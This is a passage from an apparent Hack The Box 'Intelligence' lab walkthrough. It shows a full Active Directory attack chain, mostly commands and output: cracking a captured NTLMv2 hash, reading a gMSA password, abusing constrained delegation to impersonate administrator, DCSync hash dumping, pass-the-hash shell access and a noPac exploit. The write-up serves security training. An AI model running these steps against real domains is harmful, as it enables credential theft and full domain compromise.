[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:750d4a7c9b19524c:152FBBDDCC88A120E2DD9BB4D48D44A1:010100000000000057ED906FBE37DA01EA88EE5C0FC0F2580000000002000800540042005400350001001E00570049004E002D00470043004C00370031005A00500044005300530032000400140054004200540035002E004C004F00430041004C0003003400570049004E002D00470043004C00370031005A00500044005300530032002E0054004200540035002E004C004F00430041004C000500140054004200540035002E004C004F00430041004C000800300030000000000000000000000000200000855EDAFF0F4F69AB681CD59A1154A1AEB050EFCBDB970CDF8E7C8F0C3226F53B0A001000000000000000000000000000000000000900380048005400540050002F007700650062003100320033002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```


### Crack NTLM hash

```bash
hashcat responder.hash /opt/wordlists/rockyou.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump]
└─$ hashcat responder.hash /opt/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

TED.GRAVES::intelligence:750d4a7c9b19524c:152fbbddcc88a120e2dd9bb4d48d44a1:010100000000000057ed906fbe37da01ea88ee5c0fc0f2580000000002000800540042005400350001001e00570049004e002d00470043004c00370031005a00500044005300530032000400140054004200540035002e004c004f00430041004c0003003400570049004e002d00470043004c00370031005a00500044005300530032002e0054004200540035002e004c004f00430041004c000500140054004200540035002e004c004f00430041004c000800300030000000000000000000000000200000855edaff0f4f69ab681cd59a1154a1aeb050efcbdb970cdf8e7c8f0c3226f53b0a001000000000000000000000000000000000000900380048005400540050002f007700650062003100320033002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
```

Validate the creds

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence/dump]
└─$ nxc smb intelligence.htb -u 'TED.GRAVES' -p 'Mr.Teddy'
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\TED.GRAVES:Mr.Teddy
```


# Root Flag
---

## Shell as administrator


### Read GMSA password

> https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ python /opt/sectools/ad/gMSADumper/gMSADumper.py -d intelligence.htb -u 'TED.GRAVES' -p 'Mr.Teddy'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d4a0554f26a9f3df13720481e07e0a3f
svc_int$:aes256-cts-hmac-sha1-96:23337eae58d3ae2ab25617bc34aead29ac42771db97ceb853a91b8d71b3aa2c8
svc_int$:aes128-cts-hmac-sha1-96:f433580dc80eb3dadeb2c7d5dc8e37c5
```

### Constrained delegation

> https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

`svc_int$` was allowed to delegate `WWW/dc.intelligence.htb`

![](/assets/obsidian/f90b21eaf6fc2d4d7e0c62070ba7e16a.png)

Request a service ticket to impersonate administrator

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ getST.py -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator' -aesKey 23337eae58d3ae2ab25617bc34aead29ac42771db97ceb853a91b8d71b3aa2c8 'intelligence.htb/svc_int$'
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```


### DCSync then get a shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ export KRB5CCNAME=administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ secretsdump.py -k DC.intelligence.htb -outputfile secretsdump -just-dc
Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9ce5f83a494226352bca637e8c1d6cb6:::
[...]
DC$:1000:aad3b435b51404eeaad3b435b51404ee:e160b60f0b99b2c5ab06a1f89195e976:::
svc_int$:1144:aad3b435b51404eeaad3b435b51404ee:d4a0554f26a9f3df13720481e07e0a3f:::
WIN-O2HE1NZJFD0$:5101:aad3b435b51404eeaad3b435b51404ee:59108743992e27dcb092c763a18f7d46:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
krbtgt:aes256-cts-hmac-sha1-96:99d40a110afcd64282082cf9d523f11f65b3d142078c1f3121d7fbae9a8c3a26
krbtgt:aes128-cts-hmac-sha1-96:49b9d45a7dd5422ad186041ba9d86a7e
krbtgt:des-cbc-md5:a237bfc8f7b58579
[...]
DC$:aes256-cts-hmac-sha1-96:fe44016680d0461549a5dd7b0bf7b0579b8c9a9b5bbd0cc82e188acd7d1b58f9
DC$:aes128-cts-hmac-sha1-96:f982ec8ed420d2296af733ed8461d958
DC$:des-cbc-md5:8a459226976443fe
svc_int$:aes256-cts-hmac-sha1-96:23337eae58d3ae2ab25617bc34aead29ac42771db97ceb853a91b8d71b3aa2c8
svc_int$:aes128-cts-hmac-sha1-96:f433580dc80eb3dadeb2c7d5dc8e37c5
svc_int$:des-cbc-md5:43793167b310e9a4
WIN-O2HE1NZJFD0$:aes256-cts-hmac-sha1-96:a62af8c007911f3737a6b6dcbc8c84cf6d35c1b776ecda9f42689aabbc49a191
WIN-O2HE1NZJFD0$:aes128-cts-hmac-sha1-96:d4de699727e92393caed37f5d8f65068
WIN-O2HE1NZJFD0$:des-cbc-md5:94d3ab25b9fec273
[*] Cleaning up...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ evil-winrm -i DC.intelligence.htb -u administrator -H '9075113fe16cf74f7c0f9b27e882dad3'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
intelligence\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
7c5fa0a596ca45efe3405e1b1726e6c5
```


# Additional
---

## Nopac

Discovered with my `nxc_automator.sh` script

```bash
~/scripts/ad/nxc_automator.sh low intelligence.htb -u "Tiffany.Molina" -p 'NewIntelligenceCorpUser9876'
```

![](/assets/obsidian/2e9a3d83aff8efa84feb100f7ac06e8b.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ python /opt/sectools/ad/noPac/noPac.py intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876

███    ██  ██████  ██████   █████   ██████
████   ██ ██    ██ ██   ██ ██   ██ ██
██ ██  ██ ██    ██ ██████  ███████ ██
██  ██ ██ ██    ██ ██      ██   ██ ██
██   ████  ██████  ██      ██   ██  ██████

[*] Current ms-DS-MachineAccountQuota = 10
[-] Resolved Failed: The DNS query name does not exist: dc.intelligence.htb.
[*] Selected Target dc.intelligence.htb
[*] Total Domain Admins 1
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-O2HE1NZJFD0$"
[*] MachineAccount "WIN-O2HE1NZJFD0$" password = b7skFsxbhlQc
[*] Successfully added machine account WIN-O2HE1NZJFD0$ with password b7skFsxbhlQc.
[*] WIN-O2HE1NZJFD0$ object = CN=WIN-O2HE1NZJFD0,CN=Computers,DC=intelligence,DC=htb
[*] WIN-O2HE1NZJFD0$ sAMAccountName == dc
[*] Saving a DC's ticket in dc.ccache
[*] Reseting the machine account to WIN-O2HE1NZJFD0$
[*] Restored WIN-O2HE1NZJFD0$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*] Saving a user's ticket in Administrator.ccache
[*] Rename ccache to Administrator_dc.intelligence.htb.ccache
[*] Attempting to del a computer with the name: WIN-O2HE1NZJFD0$
[-] Delete computer WIN-O2HE1NZJFD0$ Failed! Maybe the current user does not have permission.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ export KRB5CCNAME=Administrator_dc.intelligence.htb.ccache

┌──(bravosec㉿fsociety)-[~/htb/Intelligence]
└─$ nxc smb intelligence.htb --use-kcache -x whoami
SMB         10.129.208.58   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.208.58   445    DC               [+] intelligence.htb\Administrator from ccache (Pwn3d!)
SMB         10.129.208.58   445    DC               [+] Executed command via wmiexec
SMB         10.129.208.58   445    DC               intelligence\administrator
```

